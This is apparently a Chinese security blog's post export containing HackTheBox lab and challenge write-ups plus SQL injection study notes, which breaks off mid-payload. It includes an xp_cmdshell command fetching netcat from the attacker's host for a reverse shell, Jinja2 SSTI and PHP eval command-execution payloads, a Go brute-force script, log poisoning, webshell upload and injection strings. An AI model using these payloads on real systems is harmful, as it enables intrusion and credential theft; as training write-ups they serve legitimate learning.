[{"title":"Archetype靶机","url":"/2023/02/03/Archetype%E9%9D%B6%E6%9C%BA/","content":"  整个流程很明了，扫出开放端口，smb远程连接，拿到数据库密码，利用mssqlclient建立连接，利用xp_cmdshell传nc，反弹shell拿到普通用户权限，利用WinPEAS提权，拿到最高权限密码，再通过psexec拿最高权限shell。整体思路很明确，需要注意的是与数据库连接后xp_cmdshell的开启，通过xp_cmdshell执行powershell命令的写法，通过xp_cmdshell传nc和winpeas时的目录是否有写入权限，反弹nc时端口的开启。这里问答题不一一写出了，答案过程中都有。\n\n\n常规nmap扫描\n\n可以看到139和445端口开了smb服务，1433端口开了数据库。\n用smbclient连接\nsmbclient -L 10.129.251.225 列出共享文件\n\n\n\n\n连接backups文件夹\n\n将prod.dtsConfig文件get到本地查看，得到passwd:M3g4c0rp123，user id:ARCHETYPE\\SqL_svc\n接下来利用impacket包下的mssqlclient.py与数据库建立连接\n\n执行SELECT IS_SRVROLEMEMBER(‘sysadmin’) 查看权限，回显1，表示当前用户有sysadmin权限\n接着enable_xp_cmdshell; 获取xp_cmdshell\nxp_cmdshell 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 sql servevr 的原生工具\n也就是说把xp_cmdshell开启后，可以在sql中执行系统命令。\n本地监听80端口\n\n访问可以看到我们本机的文件\n\n也就是说，我们可以将payload放在本机中，然后通过xp_cmdshell来访问我们本机文件来下载到目标服务器\n然后本地nc监听，目标服务器使用nc连接获取shell\n\n通过wget下载，发现没有权限\n换个有执行写入权限的目录\n\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;wget http://10.10.16.10/nc64.exe -outfile nc64.exe&quot;\n切换到downloads目录，通过wget获取到本机nc64.exe下载到目录下\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;dir&quot;\ndir查看文件是否下载成功\n开启nc监听4443端口\n\n主机执行以下命令，开启nc\n\n反弹成功\n\n\n拿到user下的flag\n接下来，提权到root用户\n使用到WinPEAS工具，这个 WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能方法，进行扫描\n\n在主机上执行\n\n在第一个文件中查看到了administrator的密码MEGACORP_4dm1n!!，这个ConsoleHost_history.txt是powershell的历史文件，相当于 Linux 系统的.bash_history\n\n接下来使用impacket包下的psexec.py进行连接登录\nPsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。\n\n最后连接这里，一直连接出错，就重启了台机器。\n\n得到root权限下的flag\n\n","tags":["打靶","渗透测试","HTB"]},{"title":"Ambassador靶机","url":"/2023/01/31/Ambassador%E9%9D%B6%E6%9C%BA/","content":"Ambassador靶机\n信息收集打开靶机环境，拿到靶机ip\nnmap扫描端口\n\n\n扫出22 80 3000 3306端口\n访问80以及3000端口\n\n文章提示，有一个developer账户可以去访问ssh\n\n访问3000端口发现是Grafana系统\n3000端口漏洞发现Google一下，发现有任意文件读取漏洞\n\n任意文件读取漏洞利用同时，searchsploit也能搜到这个漏洞，可以直接利用exp\n\n\n\n可以看到读取 &#x2F;etc&#x2F;passwd 成功，也就意味着可以读取到任意文件，那么我们可以读一下这个Grafana系统的配置文件来获取信息\ngoogle一下，得到配置文件路径 &#x2F;etc&#x2F;grafana&#x2F;grafana.ini\n\n读取配置文件，翻看找到数据库配置以及网站用户名密码\n\n\n登入网站后台，没发现什么有用的信息\n\ngrafana.db数据库查找这时候可以将数据库脱出来，查找3306端口的用户名密码\n先将grafana.db下载下来，这样就可以用命令来操作\n\n这里用到–path-as-is 不会压缩url，如果不用就会把..&#x2F;..&#x2F;..&#x2F;给忽略就会访问不到数据库文件\n\n3306端口连接在data_source下找到mysql用户名和密码，账号：grafana 密码：dontStandSoCloseToMe63221!，拿去登录3306端口\n\n连接成功，一通操作，在whackywidget数据库里找到了developer用户的密码，根据80端口的网站提示，这个用户可以登录ssh，base64解密后登录ssh。\n\n解码得到明文密码\n22端口连接\n成功连接\n\n拿到了user权限，同时得到了user的flag\n提权这时候我们需要提权到root用户权限获取flag\n1.内核提权\n\n可以看到，没有可用的exp\n2.sudo提权https://blog.csdn.net/god_zzZ/article/details/113628793\n\n可以看到不存在该漏洞，无法提权\n3.SUID提权https://blog.csdn.net/Fly_hps/article/details/80428173\n\n没有能够用来提权的目标\n4.计划任务提权https://blog.csdn.net/q20010619/article/details/121422797\n\n没有可利用的点\n5.&#x2F;git consul API提权\n可以看到，开了一个consul服务\nhttps://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec\n这个服务的目标端口为80、443、3000、8000、8008、8080、8443， 8500、8880、8888\n查看开了哪些端口\n\n确定服务器是用8500端口开的这个consul服务\n访问失败\n\n直接跑msf里的exp也失败\n端口转发已知之前nmap扫端口也没扫到8500，容易得打，8500端口只对内网开放，这时候就需要将端口转发到本地\n\n反弹shell利用msf中的exp\n\n查看需要配置的参数进行配置\n\n反弹成功\n\n得到flag\n","tags":["打靶","渗透测试","HTB"]},{"title":"HTB Challenges—Web","url":"/2023/02/04/HTB%20Challenges%E2%80%94Web/","content":"Templated打开页面，有提示说是Flask&#x2F;jinja2框架搭建，以及靶机标题templated判断为ssti模板注入\n\n输入9测试\n\n回显9，确定为ssti模板注入\n\nhttp://178.128.171.82:31589/&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\n&#123;% if c.__name__=='_IterationGuard' %&#125;\n&#123;&#123; c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls ').read()\") &#125;&#125;\n&#123;% endif %&#125;\n&#123;% endfor %&#125;\n\n\n回显了目录列表，查看flag.txt\n\n拿到flag\n这里是典型的python-Flask模板注入，一些基础payload：\n获得基类\n#python2.7\n&#39;&#39;.__class__.__mro__[2]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n#python3.7\n&#39;&#39;.__。。。class__.__mro__[1]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n\n#python 2.7\n#文件操作\n#找到file类\n[].__class__.__bases__[0].__subclasses__()[40]\n#读文件\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()\n#写文件\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)\n\n#命令执行\n#os执行\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()\n#eval,impoer等全局函数\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()\n\n#python3.7\n#命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#文件操作\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#windows下的os命令\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).r\n\nPhonebook打开页面是一个登录框\n\n看到登录框，第一反应为sql注入，试一下万能密码admin&#39; or &#39;1&#39;=&#39;1不行，然后fuzz一下，看有没有SQL注入，没有成功。\n尝试通配符登录，用户名密码都填*，登录成功\n\n是一个查询用户电话号码的搜索页面，到处瞅瞅页面没啥问题\n问题回到那个登录框，将用户名改为页面下留言的Reese，密码为*，登录成功\n将用户名改成其他，密码为*，无法登录\n也就是说登录用户名确定为Reese，猜测密码即为flag，flag格式为HTB{}，将密码改为H*，发现登录成功，说明猜测没错接下来就是写个脚本爆破出flag值。脚本原理即为一位一位遍历，后面加上一个通配符，前面一位是对的时，会登录成功，否则登录失败。\ngo脚本如下：\npackage main\n\nimport (\n    &quot;bytes&quot;\n    &quot;fmt&quot;\n    &quot;io/ioutil&quot;\n    &quot;net/http&quot;\n    &quot;strings&quot;\n)\n\nfunc main() &#123;\n    url := &quot;http://144.126.228.187:30674/login&quot;\n    client := &amp;http.Client&#123;&#125;\n    chars := &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;&quot;\n    flag := &quot;HTB&#123;&quot;\n    password := &quot;&quot;\n    for i := 0; i &lt; len(chars); i++ &#123;\n        password = flag + string(chars[i]) + &quot;*&quot;\n        fmt.Printf(&quot;[-] testing %s&quot;, password)\n        data := []byte(&quot;username=Reese&amp;password=&quot; + password)\n        req, _ := http.NewRequest(&quot;POST&quot;, url, bytes.NewBuffer(data))\n        req.Header.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;)\n        req.Header.Add(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)\n        resp, err := client.Do(req)\n        if err != nil &#123;\n            fmt.Println(&quot;Error:&quot;, err)\n        &#125;\n        defer resp.Body.Close()\n\n        if resp.StatusCode == 200 &#123;\n            bodyBytes, _ := ioutil.ReadAll(resp.Body)\n            bodyString := string(bodyBytes)\n\n            if strings.Contains(bodyString, &quot;No search results&quot;) &#123;\n                flag += string(chars[i])\n                fmt.Println(&quot; success&quot;)\n                fmt.Printf(&quot;[+] %s\\n&quot;, flag)\n                break\n            &#125;\n        &#125;\n        fmt.Println(&quot; failed&quot;)\n\n        if flag[len(flag)-1] == &#39;&#125;&#39; &#123;\n            break\n        &#125;\n    &#125;\n\n    fmt.Printf(&quot;flag: %s\\n&quot;, flag)\n&#125;\n\nLoveTok题目给了源码，下载下来查看\n打开页面，点击最底下的按钮出现format参数，猜测这个参数有利用点，去源码中找到此参数\n\n在TimeModel.php中找到了$format\n&lt;?php\nclass TimeModel\n&#123;\n    public function __construct($format)\n    &#123;\n        $this-&gt;format = addslashes($format);\n\n        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];\n        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;\n    &#125;\n\n    public function getTime()\n    &#123;\n        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);\n        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;\n    &#125;\n&#125;\n\n这里用了addslashes()——– 使用反斜线引用字符串\n注意下面有个eval()函数，将$this-&gt;format包含在了里面，也就意味着，我们可以控制format的值来进行eval()执行代码。\n所以，第一步绕过addslashes()的转义\n使用php复杂变量进行绕过\nhttps://www.programmersought.com/article/30723400042/\n简单来说，${phpinfo()}，会先执行phpinfo(),然后将返回值作为变量名\n\n这里“还是会被转义，所以需要换个方式，不使用到这些字符\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls /\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=cat /flagLpfG2\n\n\n拿到flag，这就是一道php命令执行的题。\nToxic给了源码\n&lt;?php\nspl_autoload_register(function ($name)&#123;\n    if (preg_match(&#39;/Model$/&#39;, $name))\n    &#123;\n        $name = &quot;models/$&#123;name&#125;&quot;;\n    &#125;\n    include_once &quot;$&#123;name&#125;.php&quot;;\n&#125;);\n\nif (empty($_COOKIE[&#39;PHPSESSID&#39;]))\n&#123;\n    $page = new PageModel;\n    $page-&gt;file = &#39;/www/index.html&#39;;\n\n    setcookie(\n        &#39;PHPSESSID&#39;, \n        base64_encode(serialize($page)), \n        time()+60*60*24, \n        &#39;/&#39;\n    );\n&#125; \n\n$cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);\nunserialize($cookie);\n\n这里可以看到，cookie是文件读取目录经过序列化之后再进行base64编码后生成的\n抓个包\n\ndecode\n\n所以我们可以逆向去读取敏感文件\n\n成功读取\n\n注意到最后一行，nginx，想到日志文件包含\nnginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log，其中access.log可以打开。\n尝试读一下\n\n\n可以看到日志文件为请求头文件\n那么我们可以将请求头中的User-Agent字段更改为恶意代码，这样就会自动写入日志文件中，然后被执行。\n\n再次访问日志文件，之前更改了ua的访问已经被记录\n\nphp代码也已经被执行，回显了flag\n","tags":["打靶","HTB","Web"]},{"title":"Hack the box-Starting point TIER0通关","url":"/2023/02/01/Hack%20the%20box-Starting%20point%20TIER0%E9%80%9A%E5%85%B3/","content":"TIER0Meow靶机\n1）下载openvpn的配置，进行连接\n\n查看是否连接成功\n\n2）创建一个新的实例：新实例内网ip为10.129.98.33\n\n3）接下来就是一些问答题\n\n1.What does the acronym VM stand for?（VM是什么的缩写）virtual machine2.What tool do we use to interact with the operating system in order to start our vpn connection?(我们用什么工具与操作系统进行交互进而开启我们的vpn连接？)terminal3.What service do we use to form our vpn connection?（我们用什么服务形成我们vpn连接？）openvpn4.What is the abreviated name for a tunnel interface in the output of your vpn boot-up sequence output?（vpn启动后隧道接口的缩写名称是什么）tun5.What tool do we use to test our connection to the target?（我们用什么工具来测试与目标靶机的连接？）ping6.What is the name of the tool we use to scan the target’s ports?（我们用什么工具来扫描目标靶机的端口？）nmap7.What service do we identify on port 23&#x2F;tcp during our scans?（在我们的扫描结果中tcp23端口被我们认定为是什么服务）telnet8.What username ultimately works with the remote management login prompt for the target?（哪个用户名最终可以成功远程登录到目标靶机？）root\n9.获取flag\nnmap探测开放端口\n\n扫出23端口telnet服务\n尝试连接\n\nroot用户，空密码连接成功，拿到shell，找flag\n\n\nFawn靶机1）vpn连接，不做展示了\n2）创建实例拿到ip\n\n3）接下来几个问答题 \n1.What does the 3-letter acronym FTP stand for?（FTP是什么的简称？）\nFile Transfer Protocol\n2.Which port is the FTP service active on usually?（通常情况下，FTP活跃在哪个端口？）\n21 tcp\n3.What acronym is used for the secure version of FTP?（安全版本的FTP的简称是什么？）\nsftp\n4.What is the command we can use to send an ICMP echo request to test our connection to the target?\nping\n5.From your scans, what version is FTP running on the target?（根据你的扫描，目标上运行的FTP是什么版本?）\n-sV 探测服务&#x2F;版本信息 我们可以看到 开放21端口的ftp协议 版本是 vsftpd 3.0.3\n\n6.From your scans, what OS type is running on the target? \nUnix\n7.What is the command we need to run in order to display the ‘ftp’ client help menu?（为了显示“ftp”客户端帮助菜单，我们需要运行什么命令?）\nftp -h\n8.What is username that is used over FTP when you want to log in without having an account? \nFTP没有账户时候我们可以用username: anonymous 采用匿名访问;\n9.What is the response code we get for the FTP message ‘Login successful’? \n230\n\nFTP状态码\n\n### 1xx\n\n*肯定的初步答复，这些状态代码指示一项操作已经成功开始，但客户端希望在继续操作新命令前得到另一个答复。*\n\n- 110 重新启动标记答复。\n- 120 服务已就绪，在 nnn 分钟后开始。\n- 125 数据连接已打开，正在开始传输。\n- 150 文件状态正常，准备打开数据连接。\n\n### 2xx\n\n*肯定的完成答复，一项操作已经成功完成。客户端可以执行新命令。*\n\n- 200 命令确定。\n- 202 未执行命令，站点上的命令过多。\n- 211 系统状态，或系统帮助答复。\n- 212 目录状态。\n- 213 文件状态。\n- 214 帮助消息。\n- 215 NAME 系统类型，其中，NAME 是 Assigned Numbers 文档中所列的正式系统名称。\n- 220 服务就绪，可以执行新用户的请求。\n- 221 服务关闭控制连接。如果适当，请注销。\n- 225 数据连接打开，没有进行中的传输。\n- 226 关闭数据连接。请求的文件操作已成功（例如，传输文件或放弃文件）。\n- 227 进入被动模式 (h1,h2,h3,h4,p1,p2)。\n- 230 用户已登录，继续进行。\n- 250 请求的文件操作正确，已完成。\n- 257 已创建“PATHNAME”。\n\n### 3xx\n\n*肯定的中间答复，该命令已成功，但服务器需要更多来自客户端的信息以完成对请求的处理。*\n\n- 331 用户名正确，需要密码。\n- 332 需要登录帐户。\n- 350 请求的文件操作正在等待进一步的信息。\n\n### 4xx\n\n*瞬态否定的完成答复，该命令不成功，但错误是暂时的。如果客户端重试命令，可能会执行成功。*\n\n- 421 服务不可用，正在关闭控制连接。如果服务确定它必须关闭，将向任何命令发送这一应答。\n- 425 无法打开数据连接。\n- 426 Connection closed; transfer aborted.\n- 450 未执行请求的文件操作。文件不可用（例如，文件繁忙）。\n- 451 请求的操作异常终止：正在处理本地错误。\n- 452 未执行请求的操作。系统存储空间不够。\n\n## 5xx\n\n*永久性否定的完成答复，该命令不成功，错误是永久性的。如果客户端重试命令，将再次出现同样的错误。*\n\n- 500 语法错误，命令无法识别。这可能包括诸如命令行太长之类的错误。\n- 501 在参数中有语法错误。\n- 502 未执行命令。\n- 503 错误的命令序列。\n- 504 未执行该参数的命令。\n- 530 未登录。\n- 532 存储文件需要帐户。\n- 550 未执行请求的操作。文件不可用（例如，未找到文件，没有访问权限）。\n- 551 请求的操作异常终止：未知的页面类型。\n- 552 请求的文件操作异常终止：超出存储分配（对于当前目录或数据集）。\n- 553 未执行请求的操作。不允许的文件名。\n\n## 6xx\n\n- 600 Series，Replies regarding confidentiality and integrity\n- 631 Integrity protected reply.\n- 632 Confidentiality and integrity protected reply.\n- 633 Confidentiality protected reply.\n\n\n\n10.There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. \nls\n11.What is the command used to download the file we found on the FTP server? \nget\n下载文件通常用get和mget这两条命令。\n a) get \n 格式：get [remote-file] [local-file]\n 将文件从远端主机中传送至本地主机中。\n 如要获取远程服务器上/usr/your/1.htm，则\n\nftp&gt; get /usr/your/1.htm 1.htm (回车)\n\n b) mget　　　　　　\n 格式：mget [remote-files]\n 从远端主机接收一批文件至本地主机。\n 如要获取服务器上/usr/your/下的所有文件，则\n\nftp&gt; cd /usr/your/\n ftp&gt; mget *.* (回车)\n\n 此时每下载一个文件，都会有提示。如果要除掉提示，则在mget *.* 命令前先执行:prompt off\n\n12.获取flag,ftp连接\n\n拿到flag\nDancing靶机连接vpn,创建实例\n1.What does the 3-letter acronym SMB stand for?（SMB是什么的简称？）\nServer Message Block\n2.What port does SMB use to operate at?（用什么端口去操作SMB?）\n445\n3.What is the service name for port 445 that came up in our nmap scan?（从扫描结果来看，445端口的服务名称是什么？）\nmicrosoft-ds\n4.What is the flag or switch we can use with the SMB tool to list the contents of the share?（我们可以用SMB工具哪个“标识”或者“开关”来列举出分享的文件？）\n-L\n5.How many shares are there on Dancing? \n6.What is the name of the share we are able to access in the end with a blank password?\nWorkShares\n7.What is the command we can use within the SMB shell to download the files we find? \nget\nnmap端口扫描\n\n开放了3个服务135: msrpc （MicroSoft Remote Procedure Call，微软远程过程调用） 这是windos系统特有的服务139:netbios-ssn 用于提供文件共享服务,主要用于企业内部网之间互相访问 也是微软的服务445:就是我们说的SMB\nsmb连接\n\n访问WorkShares，找到flag.txt，get到本地查看\n\nRedeemer靶机常规连接vpn,创建实例\n\nnmap扫描\n\n得到redis 版本号5.0.7\n用redis-cli连接\ninfo看到有四个键\n\nkeys * \n\n得到flag\n1.Which TCP port is open on the machine?\n6379\n2.Which service is running on the port that is open on the machine?\nredis\n3.What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database\nIn-memory Database\n4.Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.\nredis-cli\n5.Which flag is used with the Redis command-line utility to specify the hostname?\n-h\n6.Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?\ninfo\n7.What is the version of the Redis server being used on the target machine?\n5.0.7\n8.Which command is used to select the desired database in Redis?（在Redis中使用哪个命令来选择所需的数据库?）\nselect\n9.How many keys are present inside the database with index 0?\n4\n10.Which command is used to obtain all the keys in a database?（获取数据库中所有密钥的命令是什么?）\n**keys ***\n总结这个TIER0,主要就是让我们了解Telnet、ftp、SMB、Redis这些服务，后面还有四个靶机分别为RDP：用xfreerdp 来连接、目录爆破：用gobuster来爆破、 MongoDB、Rsync，后面四个靶机需要vip，不过也很简单，没必要打。\n","tags":["打靶","渗透测试","HTB"]},{"title":"Hack the box-Starting point TIER1通关","url":"/2023/02/02/Hack%20the%20box-Starting%20point%20TIER1%E9%80%9A%E5%85%B3/","content":"TIER1Appointment靶机\n常规nmap扫端口\n\n80端口开放了一个web服务，访问\n\n一个登录窗口，题目提示sql注入，输入username：admin’# 登录\n\n拿到flag\n1.SQL全称是什么？\n答案：Structured Query Language。中文名字叫结构化查询语言\n2.最常见的SQL漏洞类型是什么？\n答案：SQL injection #SQL注入\n3.PII代表什么意思？\n答案：personally identifiable information，通过百度来的，个人身份信息或者个人验证信息\n4.OWASP 前 10 名列表将此漏洞的分类命名为什么？\n答案：A03:2021-Injection\n5.80端口跑的是什么服务以及什么版本？\n答案：上面说过了\n6.https的端口是什么？\n答案：443\n7.web应用的文件夹叫什么？\n答案：directory\n8.Not found的响应代码是什么？\n答案：404\n9.在 Gobuster 中使用什么开关来指定我们正在寻找目录而不是子域？\n答案：dir，Gobuster是一个目录猜解工具\nhttps://github.com/OJ/gobuster\n10.使用什么符号注释代码？答案：#\n11.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? \n答案：Congratulations\nSequel靶机常规nmap扫端口\n扫出3306 mariadb服务\n尝试连接\n\n拿到flag\n1.扫描时，mysql跑在哪个端口？\n3306\n2.目标主机上跑的mysql是什么版本？\nmariadb\n3.我们需要使用什么开关来指定 MySQL 服务的登录用户名？\n-u\n4.哪个用户名允许我们在不提供密码的情况下登录 MariaDB？\nroot\n5.使用什么符号可以获取一张表的所有信息?\n\n\n\n6.使用什么符号结束一个查询?;\n7.这个MySQL实例中有三个数据库在所有MySQL实例中都是通用的。这个主机所特有的第四个名字是什么?\nhtb\nCrocodile靶机常规扫端口\n\nftp连接\n\n利用得到的账号密码登录80端口网页\n\n拿到flag\n\n1.在nmap中使用默认脚本扫描的是什么命令？\n-sC。\n2.21端口上跑的服务的版本是什么？\nvsftpd3.0.3\n3.允许ftp匿名登录的代码是什么？\n230\n4.什么命令可以用于下载ftp上面的文件\nget\n6.username列表中，听起来权限比较高的用户名是什么？\nadmin\n7.What version of Apache HTTP Server is running on the target host? \napache httpd 2.4.41\n8.What switch can we use with Gobuster to specify we are looking for specific filetypes? \n-X\n9.我们可以使用目录蛮力识别哪个PHP文件，从而提供向web服务进行身份验证的机会?\n login.php\nResponder靶机1.当使用IP地址访问web服务时，我们被重定向到的域是什么?\nunika.htb\n\n2.服务器上使用哪种脚本语言生成网页?\nphp\n3.用于加载不同语言版本的网页的URL参数名称是什么?\npage\n4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. &#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”\n..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts\n5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” \n&#x2F;&#x2F;10.10.14.6&#x2F;somefile\n6.What does NTLM stand for? \nNew Technology LAN Manager\n7.我们在Responder实用程序中使用哪个标志来指定网络接口?\n-i \n8.有几个工具可以使用NetNTLMv2挑战&#x2F;响应，并尝试数百万个密码，以查看是否有任何密码生成相同的响应。一个这样的工具通常被称为“john”，但全名是什么?\njohn the ripper\n9.What is the password for the administrator user? \nbadminton\n10.我们将使用 Windows 服务（即在box上运行）使用我们恢复的密码远程访问 Responder 机器。它侦听的 TCP 端口是什么？\n5985\n因为重定向域的问题，我们是访问不了的会报错，这里修改一下hosts文件\n\nnmap扫端口\nifconfig查看本机在内网中的ip\n\nresponder开启监听\n\n网页访问远程文件包含\n\n访问后监听到hash值\n接下来使用john破解，\n\n得到administrator账号密码\n之前扫到一个5985端口开了个winrm服务，使用evil-winrm远程连接\n\n拿到shell\n\n查找flag\n\n拿到flag\nThree靶机常规nmap\n\n访问web服务\n\n通过邮箱联想到域名\n可以通过gobuster来爆破子域名，然后绑定ip 子域名\n题目有提示说是s3.thetoppers.htb\n\n添加解析\n\n访问子域名，回显\n\ns3是亚马逊的一个对象存储服务\nhttps://aws.amazon.com/cn/s3/\n访问并执行命令\n\n本来想尝试执行cd命令，发现没办法，查看提示可以执行cp命令，那么就可以上传一句话木马，拿到shell\n\n先本地生成一个一句话木马shell.php\n\n上传成功\n\n访问，直接执行命令即可拿到flag\n\n\n\n也可以通过蚁剑等webshell工具连接\n或者通过反弹shell\n方法很多，毕竟已经把马传到了服务器。\n问答题就不写了，答案过程中都有。\n总结  tier1也是没什么难的地方，第一个靶机web服务登录框sql注入，第二个靶机3306mariadb连接查询，第三个靶机ftp连接拿后台账号密码，第四个靶机远程文件包含、Responder监听、john破解拿到winrm服务用户密码，evil-winrm远程连接，第五个靶机gobuster爆破子域名、awscli上传木马、拿shell。后面还有五个vip靶机，就没打了。\n","tags":["打靶","渗透测试","HTB"]},{"title":"Hello World","url":"/2022/10/15/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"SQL注入学习笔记","url":"/2020/04/07/sql%E6%B3%A8%E5%85%A5/","content":"基础知识注入的分类基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）▲基于字符串▲数字或整数为基础的基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射）系统函数\nversion()——MySQL 版本\nuser()——数据库用户名\ndatabase()——数据库名 \n@@datadir——数据库路径\n@@version_compile_os——操作系统版本\n\n字符串连接函数\nconcat(str1,str2,…)——没有分隔符地连接字符串\nconcat_ws(separator,str1,str2,…)——含有分隔符地连接字符串\ngroup_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据\n\n一般流程猜数据库select schema_name from information_schema.schemata猜某库的数据表select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’猜某表的所有列select column_name from information_schema.columns where table_name&#x3D;’xxxxx’获取某列的内容select *** from ****PS：一般都会用到group_concat来显示所有数据。\n盲注基于布尔 SQL 盲注———-构造逻辑判断▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位\n▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 \n▲ascii(substr((select database()),1,1))&#x3D;98▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值\n▲regexp 正则注入 select user() regexp ‘^[a-z]’;Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。\n▲like 匹配注入select user() like ‘ro%’\n基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲select * from (select 